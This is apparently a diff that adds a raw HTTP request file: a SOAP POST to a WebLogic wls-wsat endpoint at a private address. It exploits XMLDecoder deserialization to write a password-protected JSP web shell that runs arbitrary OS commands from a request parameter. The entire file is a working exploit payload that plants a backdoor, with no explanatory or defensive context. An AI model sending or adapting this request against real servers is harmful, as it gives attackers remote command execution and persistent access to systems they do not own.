@@ -1,0 +1,19 @@
+POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
+Host: 10.100.13.203:10081
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv:11.0) like Gecko
+Accept: */*
+Content-Type: text/xml
+Accept-Language: zh-cn
+Content-Length: 908
+Connection: close
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/aabb.jsp</string><void method="println"><string><![CDATA[<%   if("023".equals(request.getParameter("pwd"))){  
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();  
+        int a = -1;  
+        byte[] b = new byte[2048];  
+        out.print("<pre>");  
+        while((a=in.read(b))!=-1){  
+            out.println(new String(b));  
+        }  
+        out.print("</pre>");  
+    } %>]]></string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
